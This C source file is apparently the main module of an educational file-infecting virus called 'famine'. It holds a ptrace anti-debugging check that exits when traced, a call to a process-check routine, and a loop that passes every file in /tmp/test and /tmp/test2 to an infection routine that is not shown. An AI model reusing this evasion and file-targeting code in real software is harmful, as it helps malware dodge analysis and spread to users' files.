#include "../famine.h"

void	check_debugger(void)
{
	if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) //0
		exit(0);
	ptrace(PTRACE_DETACH, 0, 0, 0); //17
}

void	process_directory(char *dir_name)
{
	DIR				*stream;
	struct dirent	*dir_entry;
	char			*filename;

	stream = opendir(dir_name);
	if (stream == NULL)
		return ;
	while ((dir_entry = readdir(stream)) != NULL)
	{
		if (!strcmp(dir_entry->d_name, ".") || !strcmp(dir_entry->d_name, ".."))
			continue ;
		filename = malloc(strlen(dir_name) + strlen(dir_entry->d_name) + 2);
		sprintf(filename, "%s/%s%c", dir_name, dir_entry->d_name, 0);
		process_file(dir_entry->d_name, filename);
		free(filename);
	}
}

int 	main(void)
{
	check_debugger();
	check_proc();
	process_directory("/tmp/test");
	process_directory("/tmp/test2");
	return (0);
}